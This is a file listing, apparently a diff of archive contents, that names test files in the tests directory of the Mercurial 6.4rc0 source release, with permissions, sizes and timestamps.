+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1247 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-confused-revert.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1662 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-context-metadata.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6542 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-context.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3689 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-context.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10068 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-contrib-check-code.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5067 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-contrib-check-commit.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1954 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-contrib-dumprevlog.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      272 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-contrib-emacs.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13515 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-contrib-perf.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2778 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-contrib-pull-logger.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16331 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-contrib-relnotes.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4603 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-contrib-testparseutil.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3874 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-contrib.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1240 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-authormap.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5379 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-baz.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      909 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-bzr-114.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4434 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-bzr-directories.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1056 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-bzr-ghosts.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7907 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-bzr-merges.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      829 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-bzr-treeroot.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6769 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-bzr.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2014 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-clonebranches.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3434 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-cvs-branch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5333 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-cvs-detectmerge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4820 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-cvs-synthetic.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13591 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-cvs.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1633 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-cvsnt-mergepoints.rlog
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4145 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-cvsnt-mergepoints.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2714 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-darcs.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3561 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-datesort.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23634 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-filemap.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    36476 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-git.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14524 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-hg-sink.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5365 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-hg-source.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5249 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-hg-startrev.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3143 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-hg-svn.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1419 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-identity.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10881 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-mtn.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22001 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-p4-filetypes.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4433 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-p4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6551 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-splicemap.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3189 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-svn-branches.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9522 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-svn-encoding.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7941 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-svn-move.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11917 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-svn-sink.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9220 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-svn-source.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1736 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-svn-startrev.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1069 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-svn-tags.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2335 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-tagsbranch-topology.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4094 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert-tla.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25882 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-convert.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   124298 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-copies-chain-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11545 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-copies-in-changeset.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10489 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-copies-unrelated.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16541 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-copies.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5785 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-copy-move-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9637 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-copy.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15518 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-copytrace-heuristics.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1611 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-custom-filters.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1051 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-debian-packages.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2204 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-debug-revlog-stats.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      869 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-debugbackupbundle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5472 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-debugbuilddag.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4120 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-debugbundle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21971 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-debugcommands.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2940 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-debugextensions.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      606 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-debugindexdot.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      388 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-debugrename.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4703 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-default-push.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5663 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-demandimport.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21614 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-devel-warnings.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1124 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-antipatience.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4788 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-binary-file.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7578 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-change.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11791 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-color.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      795 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-copy-depth.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1056 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-hashes.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8194 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-ignore-whitespace.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4513 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-indent-heuristic.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      459 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-issue2761.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      445 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-newlines.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      902 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-reverse.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      943 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-subdir.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8479 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-unified.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6296 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diff-upgrade.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1485 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diffdir.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6598 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-diffstat.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4906 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-directaccess.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      604 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dirs.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      305 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dirstate-backup.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6633 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dirstate-race.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2733 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dirstate-race2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9345 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dirstate-read-race.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12104 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dirstate-status-write-race.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12203 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dirstate.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      937 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dispatch.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      466 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dispatch.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6044 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-dispatch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1013 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-docker-packaging.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5899 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-doctest.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1800 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-double-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4477 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-drawdag.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1185 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-duplicateoptions.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1440 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-editor-filename.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      397 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-empty-dir.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1108 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-empty-file.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3167 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-empty-group.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      572 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-empty-manifest-index.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      674 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-empty.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1360 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-encode.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5481 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-encoding-align.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2346 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-encoding-func.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22566 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-encoding-textwrap.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7950 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-encoding.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2455 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-eol-add.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2836 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-eol-clone.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5709 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-eol-hook.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7155 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-eol-patch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      574 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-eol-tag.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5950 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-eol-update.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12586 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-eol.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1523 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-eolfilename.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2664 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-excessive-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19298 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-multi-source.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9663 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4085 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8626 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4371 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4892 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A5.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4905 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A6.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2486 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A7.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2534 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4445 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2931 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5076 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5821 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B5.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4175 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B6.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2577 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B7.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6366 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-C1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7100 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-C2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8406 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-C3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4994 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-C4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7261 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-D1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4077 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-D2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3309 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-D3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5978 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-D4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      558 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-execute-bit.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10130 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-export.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2952 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-extdata.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15703 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-extdiff.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4177 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-extension-timing.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    66612 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-extension.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2867 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-extensions-afterloaded.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2033 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-extensions-wrapfunction.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      600 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-extensions-wrapfunction.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      415 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-extra-filelog-entry.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2828 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fastannotate-corrupt.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      347 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fastannotate-diffopts.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15037 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fastannotate-hg.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3473 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fastannotate-perfhack.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5507 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fastannotate-protocol.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4254 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fastannotate-renames.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5097 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fastannotate-revmap.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5060 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fastannotate.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11832 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fastexport.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13057 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fetch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3417 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-filebranch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6905 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-filecache.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1108 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-filecache.py.out
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1615 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-filelog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       86 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-filelog.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6549 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fileset-generated.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19138 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fileset.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      755 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fix-clang-format.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3111 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fix-metadata.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1163 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fix-pickle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12446 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fix-topology.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    49587 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fix.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8391 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-flagprocessor.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3836 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-flags.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15010 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fncache.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2126 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-fuzz-targets.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       84 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-da.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      310 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-de.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       84 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-el.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       84 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-fr.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       84 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-it.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1426 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-ja.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       87 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-pt_BR.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      471 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-ro.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       84 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-ru.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       84 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-sv.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       87 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-zh_CN.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       87 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc-zh_TW.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1150 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gendoc.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32322 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-generaldelta.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14689 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-getbundle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11999 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-git-export.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10580 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-git-interop.t
